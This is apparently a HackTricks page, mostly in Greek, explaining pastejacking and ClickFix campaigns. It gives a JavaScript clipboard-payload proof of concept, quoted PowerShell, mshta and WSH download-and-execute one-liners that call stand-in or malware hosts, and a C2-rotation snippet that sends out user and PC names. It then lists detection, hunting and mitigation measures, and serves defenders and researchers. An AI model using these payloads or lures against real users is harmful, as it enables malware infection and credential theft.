# Clipboard Hijacking (Pastejacking) Επιθέσεις

{{#include ../../banners/hacktricks-training.md}}

> "Μη επικολλάτε ποτέ κάτι που δεν αντιγράψατε οι ίδιοι." – παλιά αλλά ακόμα έγκυρη συμβουλή

## Επισκόπηση

Clipboard hijacking – γνωστό και ως *pastejacking* – εκμεταλλεύεται το γεγονός ότι οι χρήστες συνήθως αντιγράφουν και επικολλούν εντολές χωρίς να τις ελέγχουν. Μια κακόβουλη σελίδα web (ή οποιοδήποτε περιβάλλον με δυνατότητα JavaScript όπως μια Electron ή Desktop εφαρμογή) τοποθετεί προγραμματιστικά κείμενο υπό τον έλεγχο του επιτιθέμενου στο clipboard του συστήματος. Τα θύματα ενθαρρύνονται, συνήθως μέσω προσεκτικά διαμορφωμένων οδηγιών social-engineering, να πατήσουν **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell), ή να ανοίξουν ένα τερματικό και να *επικολλήσουν* το περιεχόμενο του clipboard, εκτελώντας αμέσως αυθαίρετες εντολές.

Επειδή **δεν γίνεται λήψη αρχείου και δεν ανοίγει κάποιο attachment**, η τεχνική παρακάμπτει τους περισσότερους μηχανισμούς ασφαλείας για e-mail και web-content που παρακολουθούν attachments, macros ή άμεση εκτέλεση εντολών. Η επίθεση είναι επομένως δημοφιλής σε phishing καμπάνιες που διανέμουν κοινές οικογένειες malware όπως NetSupport RAT, Latrodectus loader ή Lumma Stealer.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Παλαιότερες καμπάνιες χρησιμοποιούσαν `document.execCommand('copy')`, οι νεότερες βασίζονται στο ασύγχρονο **Clipboard API** (`navigator.clipboard.writeText`).

## Η ροή ClickFix / ClearFake

1. Ο χρήστης επισκέπτεται έναν typosquatted ή compromised ιστότοπο (π.χ. `docusign.sa[.]com`)
2. Το ενθεμένο **ClearFake** JavaScript καλεί τον helper `unsecuredCopyToClipboard()` που αποθηκεύει αθόρυβα έναν Base64-encoded PowerShell one-liner στο clipboard.
3. Οι HTML οδηγίες λένε στο θύμα: *«Πατήστε **Win + R**, κάντε επικόλληση της εντολής και πατήστε Enter για να επιλύσετε το πρόβλημα.»*
4. `powershell.exe` εκτελείται, κατεβάζοντας ένα archive που περιέχει ένα νόμιμο executable συν ένα malicious DLL (κλασικό DLL sideloading).
5. Ο loader αποκρυπτογραφεί επιπλέον στάδια, εγχέει shellcode και εγκαθιστά persistence (π.χ. scheduled task) — τελικά τρέχοντας NetSupport RAT / Latrodectus / Lumma Stealer.

### Παράδειγμα αλυσίδας NetSupport RAT
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (νόμιμο Java WebStart) αναζητά στον φάκελό του το `msvcp140.dll`.
* Το κακόβουλο DLL επιλύει δυναμικά APIs με **GetProcAddress**, κατεβάζει δύο binaries (`data_3.bin`, `data_4.bin`) μέσω **curl.exe**, τα αποκρυπτογραφεί χρησιμοποιώντας ένα rolling XOR key `"https://google.com/"`, εγχέει το τελικό shellcode και αποσυμπιέζει το **client32.exe** (NetSupport RAT) στο `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Κατεβάζει `la.txt` με **curl.exe**
2. Εκτελεί το JScript downloader μέσα στο **cscript.exe**
3. Κατεβάζει ένα MSI payload → τοποθετεί το `libcef.dll` δίπλα σε υπογεγραμμένη εφαρμογή → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer μέσω MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
Η κλήση του **mshta** εκκινεί ένα κρυφό PowerShell script που ανακτά το `PartyContinued.exe`, εξάγει το `Boat.pst` (CAB), ανασυνθέτει το `AutoIt3.exe` μέσω `extrac32` και συνένωσης αρχείων, και τελικά εκτελεί ένα `.a3x` script το οποίο εξάγει τα διαπιστευτήρια του browser στο `sumeriavgv.digital`.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Ορισμένες εκστρατείες ClickFix παραλείπουν τελείως τις λήψεις αρχείων και ζητούν από τα θύματα να επικολλήσουν ένα one‑liner που φέρνει και εκτελεί JavaScript μέσω WSH, το καθιστά μόνιμο και αλλάζει το C2 καθημερινά. Παράδειγμα της παρατηρούμενης αλυσίδας:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Βασικά χαρακτηριστικά
- Obfuscated URL αναστρέφεται κατά το χρόνο εκτέλεσης για να αποτρέψει την επιπόλαια επιθεώρηση.
- JavaScript διατηρεί την παρουσία της μέσω ενός Startup LNK (WScript/CScript), και επιλέγει το C2 με βάση την τρέχουσα ημέρα — επιτρέποντας ταχεία domain rotation.

Ελάχιστο JS απόσπασμα που χρησιμοποιείται για να περιστρέφει C2s με βάση την ημερομηνία:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Το επόμενο στάδιο συνήθως αναπτύσσει έναν loader που εγκαθιστά persistence και τραβάει ένα RAT (π.χ., PureHVNC), συχνά κάνοντας pinning του TLS σε ένα hardcoded certificate και chunking της κίνησης.

Detection ideas specific to this variant
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (or `cscript.exe`).
- Αντικείμενα εκκίνησης: LNK στο `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` που καλεί WScript/CScript με μονοπάτι JS κάτω από `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU και τηλεμετρία γραμμής εντολών που περιέχουν `.split('').reverse().join('')` ή `eval(a.responseText)`.
- Επαναλαμβανόμενα `powershell -NoProfile -NonInteractive -Command -` με μεγάλα stdin payloads για να τροφοδοτήσουν μεγάλα scripts χωρίς μεγάλες γραμμές εντολών.
- Scheduled Tasks που στη συνέχεια εκτελούν LOLBins όπως `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` υπό ένα task/μονοπάτι που μοιάζει με updater (π.χ., `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Καθημερινά περιστρεφόμενα C2 hostnames και URLs με το pattern `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Συσχετίστε γεγονότα εγγραφής clipboard που ακολουθούνται από επικόλληση με Win+R και αμέσως μετά εκτέλεση `powershell.exe`.

Blue-teams can combine clipboard, process-creation and registry telemetry to pinpoint pastejacking abuse:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` διατηρεί ένα ιστορικό των **Win + R** εντολών – αναζητήστε ασυνήθιστα Base64 / obfuscated entries.
* Security Event ID **4688** (Process Creation) όπου `ParentImage` == `explorer.exe` και `NewProcessName` στο { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** για δημιουργίες αρχείων κάτω από `%LocalAppData%\Microsoft\Windows\WinX\` ή προσωρινά folders αμέσως πριν από το ύποπτο γεγονός 4688.
* EDR clipboard sensors (if present) – συσχετίστε `Clipboard Write` ακολουθούμενο άμεσα από μία νέα διαδικασία PowerShell.

## Μέτρα μετριασμού

1. Browser hardening – απενεργοποιήστε το clipboard write-access (`dom.events.asyncClipboard.clipboardItem` etc.) ή απαιτήστε user gesture.
2. Security awareness – διδάξτε στους χρήστες να *πληκτρολογούν* ευαίσθητες εντολές ή να τις επικολλούν πρώτα σε έναν text editor.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control για να μπλοκάρετε αυθαίρετα one-liners.
4. Network controls – μπλοκάρετε outbound requests προς γνωστούς pastejacking και malware C2 domains.

## Σχετικά κόλπα

* **Discord Invite Hijacking** often abuses the same ClickFix approach after luring users into a malicious server:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)

{{#include ../../banners/hacktricks-training.md}}
